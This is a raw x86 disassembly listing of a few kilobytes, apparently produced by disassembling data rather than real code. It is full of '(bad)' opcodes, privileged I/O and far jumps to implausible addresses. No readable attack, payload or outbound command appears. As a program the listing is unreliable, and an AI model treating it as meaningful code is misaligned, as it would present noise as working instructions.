  42d47d:	out    dx,eax
  42d47e:	xchg   edi,eax
  42d47f:	mov    bl,BYTE PTR [ecx]
  42d481:	call   0x358059ec
  42d486:	pop    ecx
  42d487:	dec    ebp
  42d488:	add    BYTE PTR ds:0x5da53f78,dl
  42d48e:	xor    eax,0x70f947dd
  42d493:	pop    ecx
  42d494:	dec    edx
  42d495:	call   ebx
  42d497:	adc    eax,esp
  42d499:	jae    0x42d4f1
  42d49b:	sub    esi,eax
  42d49d:	scas   eax,DWORD PTR es:[edi]
  42d49e:	les    edi,FWORD PTR [ebx+eax*1+0x68]
  42d4a2:	inc    esi
  42d4a3:	mov    dh,0xb1
  42d4a5:	inc    ecx
  42d4a6:	cld    
  42d4a7:	repnz push es
  42d4a9:	lock nop
  42d4ab:	mov    al,0xe6
  42d4ad:	add    BYTE PTR [ecx+0x5],ch
  42d4b0:	inc    esp
  42d4b1:	bound  ebx,QWORD PTR [ecx+0x34]
  42d4b4:	(bad)  
  42d4b5:	jbe    0x42d44b
  42d4b7:	aam    0xcd
  42d4b9:	ret    
  42d4ba:	ror    DWORD PTR [eax],cl
  42d4bc:	push   ebx
  42d4bd:	xor    al,0xad
  42d4bf:	inc    esi
  42d4c0:	pop    esp
  42d4c1:	out    0x50,al
  42d4c3:	jg     0x42d4f2
  42d4c5:	jmp    0x42d455
  42d4c7:	jmp    0x42d45f
  42d4c9:	lahf   
  42d4ca:	sahf   
  42d4cb:	or     DWORD PTR [eax+edi*4+0xe],ebp
  42d4cf:	repnz in al,dx
  42d4d1:	sbb    BYTE PTR [ebp-0x3679af6c],bh
  42d4d7:	dec    ebx
  42d4d8:	test   eax,0x3d4d5c5a
  42d4dd:	jle    0x42d52f
  42d4df:	rol    ebx,1
  42d4e1:	mov    ds:0x214e7d02,al
  42d4e6:	mov    ah,0x37
  42d4e8:	mov    al,0x69
  42d4ea:	dec    esp
  42d4eb:	shr    BYTE PTR [edx-0x311b13c3],0x44
  42d4f2:	imul   eax,edx,0xffffffa7
  42d4f5:	scas   eax,DWORD PTR es:[edi]
  42d4f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4f7:	sub    al,0x93
  42d4f9:	ret    
  42d4fa:	int    0xcc
  42d4fc:	xchg   esi,eax
  42d4fd:	dec    edi
  42d4fe:	dec    eax
  42d4ff:	ins    DWORD PTR es:[edi],dx
  42d500:	cmc    
  42d501:	ds inc edi
  42d503:	adc    DWORD PTR gs:[ebp-0x2ac0a5da],0xa1b94308
  42d50e:	mov    ss,WORD PTR [edx]
  42d510:	dec    esi
  42d511:	scas   eax,DWORD PTR es:[edi]
  42d512:	push   esi
  42d513:	mov    cl,0xe3
  42d515:	dec    ecx
  42d516:	mov    BYTE PTR [eax-0x78],0x7f
  42d51a:	mov    ah,0xd3
  42d51c:	jmp    0x4826dc09
  42d521:	jmp    0xc08:0x40a88b27
  42d528:	in     eax,0x96
  42d52a:	add    BYTE PTR [edx+ecx*8-0x65],dh
  42d52e:	(bad)  
  42d52f:	and    esp,ecx
  42d531:	test   al,0xf3
  42d533:	push   ebp
  42d534:	dec    esi
  42d535:	or     BYTE PTR [esi-0x3bb6c883],ah
  42d53b:	jae    0x42d553
  42d53d:	push   ecx
  42d53e:	loopne 0x42d4fc
  42d540:	or     eax,0xf60e1046
  42d545:	int    0x8c
  42d547:	imul   ecx,DWORD PTR [esi+0x22],0xfffffffe
  42d54b:	lods   al,BYTE PTR ds:[esi]
  42d54c:	outs   dx,BYTE PTR ds:[esi]
  42d54d:	loopne 0x42d51c
  42d54f:	fwait
  42d550:	xor    edi,DWORD PTR [ecx+0x84d4170]
  42d556:	data16 shl BYTE PTR ds:0x14aa902e,cl
  42d55d:	out    0x76,eax
  42d55f:	pop    ecx
  42d560:	jp     0x42d4ee
  42d562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d563:	xchg   ecx,eax
  42d564:	nop
  42d565:	push   ds
  42d566:	add    edx,esp
  42d568:	sbb    DWORD PTR [edi-0x32],0x1bac
	...
  42d5d3:	add    BYTE PTR [eax],al
  42d5d5:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d5db:	ja     0x42d5b6
  42d5dd:	call   FWORD PTR [ebp+0x3e]
  42d5e0:	mov    ds:0xe250f7d5,eax
  42d5e5:	mov    edx,0x1e558
  42d5ea:	inc    DWORD PTR [eax]
  42d5ec:	add    BYTE PTR [eax],al
  42d5ee:	xor    eax,0x2fd2a46a
  42d5f3:	xchg   edi,eax
  42d5f4:	push   ds
  42d5f5:	dec    edx
  42d5f6:	ins    BYTE PTR es:[edi],dx
  42d5f7:	push   0xe35e6631
  42d5fc:	stos   DWORD PTR es:[edi],eax
  42d5fd:	out    dx,eax
  42d5fe:	xchg   DWORD PTR [edi+0x62eb977c],ecx
  42d604:	xchg   BYTE PTR [edx+0x437bdf7],bh
  42d60a:	inc    eax
  42d60b:	cmp    DWORD PTR [ebp*8-0x6a4422d5],esp
  42d612:	addr16 (bad) 
  42d614:	mov    al,ds:0xb560096e
  42d619:	popf   
  42d61a:	addr16 adc edi,edx
  42d61d:	cli    
  42d61e:	sub    al,0x62
  42d620:	inc    edi
  42d621:	cmp    bh,BYTE PTR [eax+0x1b]
  42d624:	and    eax,0xa821a5b5
  42d629:	js     0x42d67a
  42d62b:	inc    ecx
  42d62c:	fisttp QWORD PTR [ebx+0x7a]
  42d630:	dec    ebx
  42d631:	pop    es
  42d632:	add    DWORD PTR [ebx+edx*1+0x3842fe72],esi
  42d639:	or     ch,BYTE PTR [eax]
  42d63b:	inc    ebx
  42d63c:	js     0x42d62b
  42d63e:	icebp  
  42d63f:	pop    ss
  42d640:	lahf   
  42d641:	sbb    al,BYTE PTR [ebx]
  42d643:	xchg   ecx,eax
  42d644:	test   al,0x3b
  42d646:	inc    ebx
  42d647:	jbe    0x42d62e
  42d649:	mov    al,0xc1
  42d64b:	mov    cl,0xf1
  42d64d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d64e:	enter  0xfb93,0x73
  42d652:	(bad)  
  42d653:	cli    
  42d654:	ds sbb dl,dl
  42d657:	cwde   
  42d658:	ins    DWORD PTR es:[edi],dx
  42d659:	pop    edx
  42d65a:	in     eax,dx
  42d65b:	pop    ds
  42d65c:	fstp   TBYTE PTR [eax-0xf76d817]
  42d662:	or     al,0x24
  42d664:	push   ss
  42d665:	adc    BYTE PTR [esi+eiz*4+0x70],bl
  42d669:	add    BYTE PTR [ecx],0xfa
  42d66c:	push   ecx
  42d66d:	push   0x27
  42d66f:	mov    eax,0x93b1630e
  42d674:	xchg   BYTE PTR [edi-0x33],dl
  42d677:	adc    BYTE PTR [edx],ch
  42d679:	xor    ebx,DWORD PTR [ebx+0x79]
  42d67c:	jmp    0x42d6df
  42d67e:	cwde   
  42d67f:	jp     0x42d6a8
  42d681:	sahf   
  42d682:	sbb    eax,0xc494492d
  42d687:	iret   
  42d688:	dec    esi
  42d689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d68a:	add    ecx,esp
  42d68c:	sbb    DWORD PTR [ebx-0x6e],ebx
  42d68f:	jge    0x42d6f8
  42d691:	out    0x5e,eax
  42d693:	and    al,BYTE PTR ds:0x8f51a244
  42d699:	in     al,0x71
  42d69b:	stos   DWORD PTR es:[edi],eax
  42d69c:	mov    bl,0x6a
  42d69e:	jp     0x42d6da
  42d6a0:	and    ah,al
  42d6a2:	stos   DWORD PTR es:[edi],eax
  42d6a3:	retf   
  42d6a4:	pop    es
  42d6a5:	pushf  
  42d6a6:	mov    al,0x56
  42d6a8:	aaa    
  42d6a9:	inc    ax
  42d6ab:	push   es
  42d6ac:	int    0x27
  42d6ae:	aad    0x2
  42d6b0:	mov    eax,0x214aa86d
  42d6b5:	mov    bh,0x53
  42d6b7:	cmp    eax,0xb4018b5b
  42d6bc:	sub    esi,esi
  42d6be:	hlt    
  42d6bf:	dec    eax
  42d6c0:	cmc    
  42d6c1:	sti    
  42d6c2:	or     cl,BYTE PTR gs:[esi-0x234ecb3c]
  42d6c9:	add    ch,BYTE PTR ds:0x616fe123
  42d6cf:	jb     0x42d719
  42d6d1:	cs iret 
  42d6d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d6d4:	sbb    ch,BYTE PTR [ecx+edx*8]
  42d6d7:	and    al,0xa3
  42d6d9:	add    dl,BYTE PTR [edi-0xf68f095]
  42d6df:	neg    edx
  42d6e1:	sahf   
  42d6e2:	sub    BYTE PTR [edi+0x10],ah
  42d6e5:	pop    ebx
  42d6e6:	push   eax
  42d6e7:	and    cl,bl
  42d6e9:	mov    al,0x41
  42d6eb:	(bad)  
  42d6ec:	pop    ebp
	...
  42d755:	add    bl,dh
  42d757:	add    esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0xe4
  42d763:	and    ch,ch
  42d765:	mov    BYTE PTR [edi-0x1a],dl
  42d768:	add    DWORD PTR [eax],eax
  42d76a:	inc    DWORD PTR [eax]
  42d76c:	add    BYTE PTR [eax],al
  42d76e:	push   eax
  42d76f:	jbe    0x42d749
  42d771:	mov    al,ds:0xf9d2ce2d
  42d776:	jmp    0x42d7f6
  42d778:	shr    DWORD PTR [esi-0x44444537],0xc8
  42d77f:	rcl    BYTE PTR [edx+ecx*4-0x18],1
  42d783:	mov    cl,bh
  42d785:	sub    dl,cl
  42d787:	ret    0xb171
  42d78a:	and    ch,BYTE PTR [ebx]
  42d78c:	and    eax,0x6cc71d44
  42d791:	push   ss
  42d792:	or     al,0x30
  42d794:	and    bh,BYTE PTR ds:0x4f661787
  42d79a:	xchg   edi,eax
  42d79b:	test   al,0xea
  42d79d:	shr    BYTE PTR [esi-0x5d977bca],0x38
  42d7a4:	xchg   esp,eax
  42d7a5:	cs push di
  42d7a8:	test   al,0xc2
  42d7aa:	xchg   ebx,eax
  42d7ab:	sbb    DWORD PTR [ebp+0x484d5547],0xffffffe8
  42d7b2:	cmc    
  42d7b3:	aas    
  42d7b4:	mov    ah,0x8c
  42d7b6:	fwait
  42d7b7:	int    0x1e
  42d7b9:	jecxz  0x42d781
  42d7bb:	inc    esp
  42d7bc:	rcl    BYTE PTR [eax-0x40],cl
  42d7bf:	xchg   edx,eax
  42d7c0:	jge    0x42d79a
  42d7c2:	push   es
  42d7c3:	shl    BYTE PTR [esi],0x59
  42d7c6:	popf   
  42d7c7:	dec    edx
  42d7c8:	iret   
  42d7c9:	test   eax,0xc8b4b3f9
  42d7ce:	adc    eax,0x4b07a18
  42d7d3:	bound  ecx,QWORD PTR [esi-0x38]
  42d7d6:	daa    
  42d7d7:	rcl    DWORD PTR [edx+ebp*8],cl
  42d7da:	sub    ecx,ebp
  42d7dc:	popa   
  42d7dd:	xchg   ebx,eax
  42d7de:	enter  0x8ec4,0xd1
  42d7e2:	test   DWORD PTR [esi-0x55],edi
  42d7e5:	data16 jae 0x42d7b1
  42d7e8:	cmp    BYTE PTR [eax],dh
  42d7ea:	add    eax,0x89c1de13
  42d7ef:	jg     0x42d7b7
  42d7f1:	add    al,0x5d
  42d7f3:	dec    ebp
  42d7f4:	cmp    DWORD PTR [edx],eax
  42d7f6:	xchg   esi,eax
  42d7f7:	out    0xa5,al
  42d7f9:	push   edi
  42d7fa:	arpl   WORD PTR [edi-0x5d],bx
  42d7fd:	inc    ecx
  42d7fe:	fiadd  WORD PTR [esp+ebx*4]
  42d801:	es ret 0x201e
  42d805:	ja     0x42d83c
  42d807:	adc    ch,bh
  42d809:	aad    0x4f
  42d80b:	sbb    ecx,DWORD PTR [ebx]
  42d80d:	jle    0x42d7d0
  42d80f:	sar    BYTE PTR [edi+esi*4],1
  42d812:	(bad)  
  42d813:	shr    BYTE PTR [edi+0x17],cl
  42d816:	popa   
  42d817:	(bad)  
  42d818:	int3   
  42d819:	call   0x93783711
  42d81e:	aas    
  42d81f:	shr    BYTE PTR [eax-0x2d],1
  42d822:	retf   
  42d823:	repz lock sub esi,DWORD PTR [ebx+0x6e2249fe]
  42d82b:	shr    DWORD PTR [ecx],cl
  42d82d:	gs es or eax,0x812aa7aa
  42d834:	mov    edx,0xcf9f6467
  42d839:	mov    al,0xaf
  42d83b:	dec    BYTE PTR [edx+0x1e54d584]
  42d841:	in     al,0x27
  42d843:	adc    al,0x93
  42d845:	xchg   esi,eax
  42d846:	mov    ecx,0xcf84baac
  42d84b:	xchg   ebx,eax
  42d84c:	test   eax,ebx
  42d84e:	std    
  42d84f:	aaa    
  42d850:	or     DWORD PTR [edx-0x57],ebp
  42d853:	in     al,0xc4
  42d855:	adc    DWORD PTR [edx-0x27],ecx
  42d858:	outs   dx,DWORD PTR ds:[esi]
  42d859:	mov    eax,0x9a937470
  42d85e:	jbe    0x42d841
  42d860:	or     eax,0xa26ebebe
  42d865:	and    cl,BYTE PTR [ebx+ebp*2-0x2]
  42d869:	sub    BYTE PTR [edx-0x62],0x49
	...
  42d8d5:	add    BYTE PTR [esi-0x62a06765],dl
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0xe0c6961a
  42d8e3:	dec    eax
  42d8e4:	shl    BYTE PTR [esi+edx*2-0xfffe19],1
  42d8eb:	add    BYTE PTR [eax],al
  42d8ed:	add    BYTE PTR [edi],ah
  42d8ef:	pop    esp
  42d8f0:	add    DWORD PTR [eax],esi
  42d8f2:	out    dx,al
  42d8f3:	pop    edi
  42d8f4:	mov    ebp,0x125c939e
  42d8f9:	mov    ds:0x72b10835,al
  42d8fe:	push   ebx
  42d8ff:	std    
  42d900:	(bad)  
  42d901:	leave  
  42d902:	cwde   
  42d903:	lods   al,BYTE PTR ds:[esi]
  42d905:	adc    eax,0xe2c5c60a
  42d90a:	push   ebx
  42d90b:	(bad)  
  42d90c:	sahf   
  42d90d:	inc    esi
  42d90e:	pusha  
  42d90f:	or     BYTE PTR [edi+0x1c],bl
  42d912:	out    0x2c,eax
  42d914:	cmp    esi,esp
  42d916:	fdivr  QWORD PTR [edx+0x17563c5c]
  42d91c:	fdivr  DWORD PTR [ecx]
  42d91e:	ror    BYTE PTR [eax],1
  42d920:	push   esp
  42d921:	and    BYTE PTR [ecx+0x76],dh
  42d924:	inc    edi
  42d925:	and    esp,DWORD PTR [edx-0x6a40b88e]
  42d92b:	xor    esp,ebp
  42d92d:	dec    edx
  42d92e:	imul   edi,DWORD PTR [esi-0x11],0x1ccaadb1
  42d935:	loope  0x42d961
  42d937:	(bad)  
  42d938:	mov    ch,0xcf
  42d93a:	popa   
  42d93b:	mov    esi,0x3ef5748e
  42d940:	addr16 push eax
  42d942:	jge    0x42d8f4
  42d944:	test   BYTE PTR cs:[ecx-0x3d8fb657],ch
  42d94b:	(bad)  
  42d94c:	nop
  42d94d:	inc    edi
  42d94e:	stos   DWORD PTR es:[edi],eax
  42d94f:	outs   dx,BYTE PTR ds:[esi]
  42d950:	xlat   BYTE PTR ds:[ebx]
  42d951:	adc    edi,DWORD PTR [edx-0x5d56b7ae]
  42d957:	push   0x71e52bb1
  42d95c:	scas   eax,DWORD PTR es:[edi]
  42d95d:	sbb    DWORD PTR [eax-0x54],ecx
  42d960:	adc    ch,BYTE PTR [ecx]
  42d962:	ja     0x42d8f0
  42d964:	call   0x12a2d4a4
  42d969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d96a:	mov    ah,0xeb
  42d96c:	cdq    
  42d96d:	pop    edi
  42d96e:	cmc    
  42d96f:	push   ds
  42d970:	add    DWORD PTR [ebx-0x2d],esp
  42d973:	xchg   ecx,eax
  42d974:	rcr    DWORD PTR [edi],1
  42d976:	and    BYTE PTR ds:0xd561564e,0xd5
  42d97d:	cdq    
  42d97e:	pop    ebp
  42d97f:	mov    dh,0x4e
  42d981:	std    
  42d982:	das    
  42d983:	fcomp  QWORD PTR [ecx+0x708d10de]
  42d989:	xchg   bl,al
  42d98b:	xor    edi,ebp
  42d98d:	scas   al,BYTE PTR es:[edi]
  42d98e:	mov    dh,0xac
  42d990:	xor    eax,0x9e82f68b
  42d995:	pusha  
  42d996:	loopne 0x42d9ec
  42d998:	add    eax,0x640f785c
  42d99d:	mov    esi,0x23cba054
  42d9a2:	sahf   
  42d9a3:	inc    esp
  42d9a4:	inc    ebp
  42d9a5:	test   DWORD PTR [eax],ebp
  42d9a7:	xchg   ecx,eax
  42d9a8:	jp     0x42d977
  42d9aa:	add    ebp,esi
  42d9ac:	sub    al,0x36
  42d9ae:	out    dx,al
  42d9af:	(bad)  
  42d9b0:	pop    ds
  42d9b1:	scas   al,BYTE PTR es:[edi]
  42d9b2:	push   edx
  42d9b3:	pushf  
  42d9b4:	adc    BYTE PTR [ecx-0x77],al
  42d9b7:	mov    edx,0x621a2cd1
  42d9bc:	xchg   esi,eax
  42d9bd:	or     eax,DWORD PTR [ebx]
  42d9bf:	sbb    edi,DWORD PTR [edi+0x2d5e70b6]
  42d9c5:	popf   
  42d9c6:	cmp    al,0xcf
  42d9c8:	fsub   st(4),st
  42d9ca:	mov    esp,0xa4a03a27
  42d9cf:	sub    bh,0x12
  42d9d2:	test   ebp,esi
  42d9d4:	repnz mov edi,DWORD PTR [ecx+edi*8+0x5a]
  42d9d9:	ret    0x244c
  42d9dc:	jmp    0xf3e2f695
  42d9e1:	push   ss
  42d9e2:	or     edi,ebx
  42d9e4:	cdq    
  42d9e5:	xchg   esp,eax
  42d9e6:	add    BYTE PTR ds:0x638e63f3,cl
  42d9ec:	cmc    
	...
  42da55:	add    cl,bh
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	push   0x55b7ef46
  42da67:	call   0x141da6d
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	ss pop ss
  42da70:	pop    ecx
  42da71:	mov    bh,BYTE PTR [ecx]
  42da73:	mov    DWORD PTR [esi-0x5a],0x798e7f54
  42da7a:	sbb    BYTE PTR [edx+0x96c0c8b],ch
  42da80:	hlt    
  42da81:	push   ss
  42da82:	clc    
  42da83:	and    edx,DWORD PTR [ecx+0x1b846a71]
  42da89:	rcl    bh,0x71
  42da8c:	sbb    al,ah
  42da8e:	out    dx,al
  42da8f:	mov    ecx,0xf571ed1e
  42da94:	test   DWORD PTR [ebx-0x33],0xd1f5dff
  42da9b:	adc    al,0x80
  42da9d:	ins    WORD PTR es:[edi],dx
  42da9f:	dec    eax
  42daa0:	pop    ebx
  42daa1:	xor    dh,BYTE PTR [eax+0x32]
  42daa4:	(bad)  
  42daa5:	xchg   edx,eax
  42daa6:	xchg   esp,eax
  42daa7:	dec    esi
  42daa8:	hlt    
  42daa9:	lods   al,BYTE PTR ds:[esi]
  42daaa:	shl    BYTE PTR [edi+0x18],cl
  42daad:	sub    ecx,DWORD PTR [ecx+edx*8]
  42dab0:	add    DWORD PTR [eax-0x6116cc4],esi
  42dab6:	in     eax,0x29
  42dab8:	enter  0xf65b,0x90
  42dabc:	stc    
  42dabd:	sub    al,0xbe
  42dabf:	hlt    
  42dac0:	cmc    
  42dac1:	cmp    DWORD PTR [eax],0x33df9f7d
  42dac7:	cmp    DWORD PTR [eax-0x55e5427],edi
  42dacd:	and    eax,0x431f2a5f
  42dad2:	imul   eax,DWORD PTR [edi+0x340a8c4f],0x4a248229
  42dadc:	mov    DWORD PTR [edi+0x6916eebb],esp
  42dae2:	enter  0x52c,0xf0
  42dae6:	out    0x40,eax
  42dae8:	push   0x9916560b
  42daed:	rcr    DWORD PTR [edx],cl
  42daef:	or     ebx,esp
  42daf1:	xchg   esp,eax
  42daf2:	add    dl,BYTE PTR [edi+0x6a]
  42daf5:	cmp    DWORD PTR [eax+0x454ef806],ecx
  42dafb:	dec    ebx
  42dafc:	cdq    
  42dafd:	sub    bl,0xb5
  42db00:	sub    ebx,DWORD PTR [esp+ecx*8]
  42db03:	in     al,dx
  42db04:	jle    0x42db82
  42db06:	jg     0x42db23
  42db08:	mov    DWORD PTR [edx+0x425a38c8],0x6e287c3d
  42db12:	stos   BYTE PTR es:[edi],al
  42db13:	adc    al,0x67
  42db15:	fdivr  QWORD PTR [ecx+0x39]
  42db18:	jmp    0x42db4a
  42db1a:	int    0xef
  42db1c:	mov    ah,0xce
  42db1e:	lods   al,BYTE PTR ds:[esi]
  42db1f:	pusha  
  42db20:	call   0x8a73:0x106ff664
  42db27:	in     al,dx
  42db28:	push   esi
  42db29:	daa    
  42db2a:	cdq    
  42db2b:	loopne 0x42db61
  42db2d:	push   cs
  42db2e:	pop    ecx
  42db2f:	outs   dx,BYTE PTR ds:[esi]
  42db30:	cmp    eax,0x105c6a78
  42db35:	test   BYTE PTR [ebp-0x771de6a2],0xe8
  42db3c:	sbb    ebp,DWORD PTR [ecx+0x4ae9da09]
  42db42:	fwait
  42db43:	rcr    BYTE PTR [eax],0xc
  42db46:	int3   
  42db47:	mov    ebx,cs
  42db49:	xchg   ecx,eax
  42db4a:	je     0x42db43
  42db4c:	dec    DWORD PTR [eax]
  42db4e:	and    edx,edx
  42db50:	adc    al,0x5a
  42db52:	push   0xffffffeb
  42db54:	sbb    eax,0xf3a8e353
  42db59:	in     al,dx
  42db5a:	push   ebp
  42db5b:	ret    
  42db5c:	push   0x2ec3f7a9
  42db61:	and    DWORD PTR [ebp+0x34138f9f],0xbf80fc68
  42db6b:	sbb    BYTE PTR ds:0x0,ah
	...
  42dbd5:	add    BYTE PTR [eax-0x2093e086],dh
  42dbdb:	ins    DWORD PTR es:[edi],dx
  42dbdc:	repz (bad) 
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42db9a
  42dbe3:	and    al,0xf4
  42dbe5:	adc    DWORD PTR [ecx+ebp*8+0x1],0xff00
  42dbed:	add    bh,cl
  42dbef:	mov    al,0xfd
  42dbf1:	aas    
  42dbf2:	mov    ds:0x803babfe,al
  42dbf7:	sub    al,0xcf
  42dbf9:	push   esi
  42dbfa:	mov    ch,0x17
  42dbfc:	mov    ds:0x377d0257,al
  42dc01:	mov    al,0x63
  42dc03:	pushf  
  42dc04:	out    0xa7,eax
  42dc06:	sbb    cl,BYTE PTR [edi-0x2f9e8fc]
  42dc0c:	(bad)  
  42dc0d:	loop   0x42db99
  42dc0f:	mov    fs,ebp
  42dc11:	jae    0x42dc05
  42dc13:	mov    esp,0xdfcc2fc0
  42dc18:	mov    esi,0x9d1d053c
  42dc1d:	sbb    al,0x8e
  42dc1f:	sub    al,0x48
  42dc21:	cmp    ah,BYTE PTR [edx+0x2a]
  42dc24:	shr    eax,0xac
  42dc27:	cmc    
  42dc28:	adc    DWORD PTR [ebx],edx
  42dc2a:	daa    
  42dc2b:	add    DWORD PTR [esi-0x20],0x7c
  42dc2f:	mov    edx,0x4d8225e
  42dc34:	xor    BYTE PTR [eax],bl
  42dc36:	push   ebx
  42dc37:	pop    ds
  42dc38:	cmp    edi,DWORD PTR [eax+0x2804e057]
  42dc3e:	bound  edx,QWORD PTR [edi+0x6b]
  42dc41:	mov    ebx,0x876bdc75
  42dc46:	sub    edx,ecx
  42dc48:	inc    ecx
  42dc49:	mov    cs,WORD PTR [ecx]
  42dc4b:	std    
  42dc4c:	mov    ds:0x94df05f0,eax
  42dc51:	xor    DWORD PTR [edi],esi
  42dc53:	dec    DWORD PTR [ebx+0x2cfefd52]
  42dc59:	shl    BYTE PTR [edi],cl
  42dc5b:	outs   dx,BYTE PTR ds:[esi]
  42dc5c:	jmp    DWORD PTR [ecx+0x7f744284]
  42dc62:	(bad)  
  42dc63:	gs jp  0x42dc98
  42dc66:	xor    BYTE PTR [eax],bl
  42dc68:	stos   DWORD PTR es:[edi],eax
  42dc69:	and    eax,0x50ca489f
  42dc6e:	pusha  
  42dc6f:	cli    
  42dc70:	push   es
  42dc71:	test   al,0x60
  42dc73:	out    0xf3,eax
  42dc75:	out    0x8d,eax
  42dc77:	int3   
  42dc78:	stc    
  42dc79:	dec    esp
  42dc7a:	or     eax,0xa8722b4c
  42dc7f:	inc    ebx
  42dc80:	leave  
  42dc81:	or     eax,0x4872dbd3
  42dc86:	data16 je 0x42dc25
  42dc89:	pop    ebp
  42dc8a:	jo     0x42dcf0
  42dc8c:	imul   BYTE PTR [ecx-0x4b]
  42dc8f:	jnp    0x42dd10
  42dc91:	push   0xe1b4d2cf
  42dc96:	sbb    ebx,edx
  42dc98:	pop    eax
  42dc99:	dec    esi
  42dc9a:	icebp  
  42dc9b:	sbb    ebp,DWORD PTR [ecx]
  42dc9d:	ins    DWORD PTR es:[edi],dx
  42dc9e:	das    
  42dc9f:	push   cs
  42dca0:	rcr    BYTE PTR [ecx-0x48aeb2e],0xb6
  42dca7:	mov    bh,0x86
  42dca9:	(bad)  
  42dcaa:	shr    BYTE PTR [ebx],0xf9
  42dcad:	lahf   
  42dcae:	cld    
  42dcaf:	jne    0x42dd2e
  42dcb1:	das    
  42dcb2:	xchg   esp,eax
  42dcb3:	addr16 js 0x42dcfa
  42dcb6:	cmp    eax,0x667b4dda
  42dcbb:	out    dx,eax
  42dcbc:	pop    ecx
  42dcbd:	jl     0x42dcef
  42dcbf:	pop    ss
  42dcc0:	punpcklwd mm7,mm2
  42dcc3:	dec    esp
  42dcc4:	lea    edx,[edx-0x22]
  42dcc7:	pop    esp
  42dcc8:	call   0x37aa4ea9
  42dccd:	sbb    eax,0xdf765489
  42dcd2:	scas   eax,DWORD PTR es:[edi]
  42dcd3:	outs   dx,DWORD PTR ds:[esi]
  42dcd4:	dec    ebx
  42dcd5:	les    esp,FWORD PTR [ebx+0x5a4125c6]
  42dcdb:	and    dl,bh
  42dcdd:	mov    ebp,0x80e6ff2d
  42dce2:	and    esp,DWORD PTR [edi+0xf631a39]
  42dce8:	aad    0xe2
  42dcea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dceb:	push   0xfffffff3
	...
  42dd55:	add    BYTE PTR [ecx],bh
  42dd57:	mov    bh,0x6d
  42dd59:	pxor   mm3,mm7
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	jge    0x42dd50
  42dd64:	mov    ah,0x97
  42dd66:	push   ebx
  42dd67:	jmp    0x0:0xff0001
  42dd6e:	imul   ebp,ebx,0xffffffcd
  42dd71:	push   ebp
  42dd72:	jb     0x42dd80
  42dd74:	lods   eax,DWORD PTR ds:[esi]
  42dd75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd76:	test   al,0x7d
  42dd78:	xchg   edx,eax
  42dd79:	mov    al,0x2a
  42dd7b:	pop    es
  42dd7c:	push   ebp
  42dd7d:	dec    esp
  42dd7e:	cmp    eax,0xe12d8d21
  42dd83:	(bad)  
  42dd84:	bound  edi,QWORD PTR [eax]
  42dd86:	fild   DWORD PTR [edi+ebp*8]
  42dd89:	out    0x84,al
  42dd8b:	or     esi,edi
  42dd8d:	mov    ah,0xc5
  42dd8f:	enter  0xd2c0,0xa6
  42dd93:	jae    0x42dd7a
  42dd95:	mov    ebx,0xa7f7e29f
  42dd9a:	ins    BYTE PTR es:[edi],dx
  42dd9b:	push   esi
  42dd9c:	stos   DWORD PTR es:[edi],eax
  42dd9d:	dec    ecx
  42dd9e:	lahf   
  42dd9f:	leave  
  42dda0:	and    BYTE PTR [ebx],ah
  42dda2:	fcom   DWORD PTR [edi+0x3c]
  42dda5:	mov    ecx,0x7851ad7a
  42ddaa:	call   0xfaa9:0xad238f60
  42ddb1:	stos   DWORD PTR es:[edi],eax
  42ddb2:	stc    
  42ddb3:	push   esi
  42ddb4:	(bad)  
  42ddb5:	push   esi
  42ddb6:	push   esp
  42ddb7:	mov    al,ds:0xb1465ad1
  42ddbc:	iret   
  42ddbd:	push   esp
  42ddbe:	aam    0x4a
  42ddc0:	pop    esp
  42ddc1:	jge    0x42dd78
  42ddc3:	mov    al,bl
  42ddc5:	sbb    al,0xa9
  42ddc7:	pop    eax
  42ddc8:	xor    al,0x2c
  42ddca:	sub    edi,ebx
  42ddcc:	int    0x1a
  42ddce:	retf   0x7d92
  42ddd1:	arpl   si,si
  42ddd3:	ss pop ds
  42ddd5:	jg     0x42ddd3
  42ddd7:	jl     0x42de00
  42ddd9:	mov    bl,0xa1
  42dddb:	(bad)  
  42dddc:	call   0x8fa5:0xd79e46e
  42dde3:	out    0xc1,eax
  42dde5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dde6:	push   ss
  42dde7:	sub    al,0xbb
  42dde9:	dec    edx
  42ddea:	data16 outs dx,BYTE PTR ds:[esi]
  42ddec:	pop    ebp
  42dded:	adc    al,BYTE PTR [eax+0x12]
  42ddf0:	push   ebx
  42ddf1:	add    al,0x8c
  42ddf3:	lock fwait
  42ddf5:	retf   0x3378
  42ddf8:	sub    ah,al
  42ddfa:	xchg   esi,eax
  42ddfb:	mov    edx,0x84c22de2
  42de00:	mov    eax,ds:0xc4742afe
  42de05:	cmp    eax,0xb64a758e
  42de0a:	xor    DWORD PTR [edx+0x21347e82],ecx
  42de10:	repnz lds ebp,FWORD PTR [ebx]
  42de13:	(bad)  
  42de14:	inc    ebx
  42de15:	out    0x18,al
  42de17:	(bad)  
  42de18:	aaa    
  42de19:	mov    esp,0xad3945cb
  42de1e:	inc    eax
  42de1f:	sbb    BYTE PTR [eax+0x4d],dh
  42de22:	dec    edi
  42de23:	js     0x42ddce
  42de25:	bound  esp,QWORD PTR [edx+esi*2]
  42de28:	in     eax,dx
  42de29:	sti    
  42de2a:	pop    ebx
